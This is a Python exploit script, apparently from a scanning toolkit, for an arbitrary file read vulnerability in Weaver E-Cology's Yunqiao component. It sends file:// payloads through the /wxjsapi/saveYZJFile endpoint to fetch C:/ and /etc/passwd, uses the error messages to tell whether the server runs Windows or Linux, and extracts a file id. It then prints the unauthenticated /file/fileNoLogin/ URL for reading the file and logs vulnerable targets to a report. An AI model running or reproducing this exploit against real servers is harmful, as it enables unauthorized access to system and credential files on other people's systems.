import re
import requests
import time

filename = "./reps/E_Cology云桥任意文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))

payload1 = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
payload2 = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
def eccbafr(url):
    url1 = url + payload1
    url2 = url + payload2
    readfile = url + "/file/fileNoLogin/"
    try:
        # windows
        reps1 = requests.get(url=url1,headers=headers,verify=False,timeout=10)
        # linux
        reps2 = requests.get(url=url2,headers=headers,verify=False,timeout=10)

        if "无法验证您的身份" in reps1.text and "无法验证您的身份" in reps2.text:
            print("\033[0;31;40m[-] {} 未发现E_Cology云桥任意文件读取漏洞\033[0m".format(url))
        else:
            if "No such file or directory" in reps1.text:
                print("\033[0;32;40m[+] {} 疑似存在E_Cology云桥任意文件读取漏洞！！！ 目标为linux系统\033[0m".format(url))
                id = re.findall(r'"id":"(.*?)"', reps2.text)[0]
                print("\033[0;32;40m获取id: {},请自行尝试读取文件payload:{}{}\033[0m".format(id,readfile,id))
                f = open(filename, "a+", encoding="utf-8")
                f.write(url2)
                f.write("\n")
                f.write("id: "+id)
                f.write("\n")
                f.close()

            elif "系统找不到指定的路径" in reps2.text or "The system cannot find the path specified" in reps2.text:
                print("\033[0;32;40m[+] {} 疑似存在E_Cology云桥任意文件读取漏洞！！！ 目标为windows系统\033[0m".format(url))
                id = re.findall(r'"id":"(.*?)"', reps1.text)[0]
                print("\033[0;32;40m获取id: {},请自行尝试读取文件payload:{}{}\033[0m".format(id,readfile,id))
                f = open(filename, "a+", encoding="utf-8")
                f.write(url1)
                f.write("\n")
                f.write("id: "+id)
                f.write("\n")
                f.close()

            else:
                print("目标可能存在WAF:{}".format(url))

    except Exception as e:
        print("url:{} 请求失败".format(url))
